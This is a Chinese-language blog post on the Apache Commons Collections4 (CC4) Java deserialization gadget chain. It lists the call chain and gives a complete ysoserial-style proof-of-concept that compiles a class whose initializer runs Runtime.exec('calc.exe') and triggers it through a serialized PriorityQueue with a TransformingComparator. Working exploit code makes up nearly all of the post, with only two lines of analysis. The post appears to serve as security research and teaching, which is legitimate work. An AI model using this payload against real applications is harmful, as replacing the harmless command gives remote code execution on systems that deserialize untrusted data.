# CommonsCollections4 （CC4链）

## 说明

### 导入依赖

    
    
    <dependency>  
    <groupId>org.apache.commons</groupId>  
    <artifactId>commons-collections4</artifactId>  
    <version>4.0</version>  
    </dependency>

### 利用链

    
    
    PriorityQueue.readObject()  
    PriorityQueue.heapify()  
    PriorityQueue.siftDown()  
    PriorityQueue.siftDownUsingComparator()  
    TransformingComparator.compare()  
    ChainedTransformer.transform()  
    ConstantTransformer.transform()  
    InstantiateTransformer.transform()  
    TrAXFilter.TrAXFilter()  
    TemplatesImpl.newTransformer()  
    TemplatesImpl.getTransletInstance()

  

### 简化后的payload

    
    
    package com.ysoserial;  
    ​  
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
    import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  
    import javassist.CannotCompileException;  
    import javassist.ClassPool;  
    import javassist.CtClass;  
    import javassist.NotFoundException;  
    import org.apache.commons.collections4.Transformer;  
    import org.apache.commons.collections4.comparators.TransformingComparator;  
    import org.apache.commons.collections4.functors.ChainedTransformer;  
    import org.apache.commons.collections4.functors.ConstantTransformer;  
    import org.apache.commons.collections4.functors.InstantiateTransformer;  
    ​  
    ​  
    import javax.xml.transform.Templates;  
    import java.io.*;  
    import java.lang.reflect.Field;  
    import java.util.PriorityQueue;  
    ​  
    public class CommonCollections4 {  
    public static void main(String[] args) throws CannotCompileException, NotFoundException, IOException, NoSuchFieldException, IllegalAccessException, CannotCompileException, NotFoundException, ClassNotFoundException {  
    ​  
    ​  
    ClassPool pool = ClassPool.getDefault();  
    CtClass doCalc = pool.makeClass("DoCalc");  
    CtClass abstractTranslet=pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");  
    doCalc.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc.exe\");");  
    doCalc.setSuperclass(abstractTranslet);  
    byte[] bytes1 = doCalc.toBytecode();  
    ​  
    ​  
    TemplatesImpl templates = new TemplatesImpl();  
    setFieldValue(templates,"_name","ZeanHike");  
    setFieldValue(templates,  
          "_bytecodes",  
          new byte[][]{  
                  bytes1  
          });  
    ​  
    ​  
    Transformer doNewTransformer = new ChainedTransformer(new Transformer[]{  
          new ConstantTransformer(TrAXFilter.class),  
          new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})  
    });  
    ​  
    TransformingComparator transformingComparator = new TransformingComparator((Transformer) doNewTransformer);  
    PriorityQueue queue = new PriorityQueue(2,transformingComparator);  
    setFieldValue(queue,"size",2);  
    Object[] q=new Object[]{templates,templates};  
    setFieldValue(queue,"queue",q);  
    ​  
    ​  
    ​  
    //序列化  
    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();  
    ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);  
    objectOutputStream.writeObject(queue);  
    byteArrayOutputStream.flush();  
    byte[] bytes = byteArrayOutputStream.toByteArray();  
    ​  
    ​  
    //反序列化  
    ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);  
    ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);  
    objectInputStream.readObject();  
    }  
    public static void setFieldValue(Object obj,String field,Object value) throws NoSuchFieldException, IllegalAccessException {  
    Field field1 = obj.getClass().getDeclaredField(field);  
    field1.setAccessible(true);  
    field1.set(obj,value);  
    }  
    }

## 分析正文

CC4的利用链用了CC3的后半条利用链

CC4的TransformingComparator不使用InvokerTransformer利用链，用了CC3中的ChainedTransformer作为利用链

![1650506302_6260ba3e7719151860b8d.png!small?1650506302727](https://image.3001.net/images/20220421/1650506302_6260ba3e7719151860b8d.png!small?1650506302727)

分析结束

召唤神兽！！

![1650434595_625fa223918b2dbb09f4f.png!small?1650434596613](https://image.3001.net/images/20220420/1650434595_625fa223918b2dbb09f4f.png!small?1650434596613)

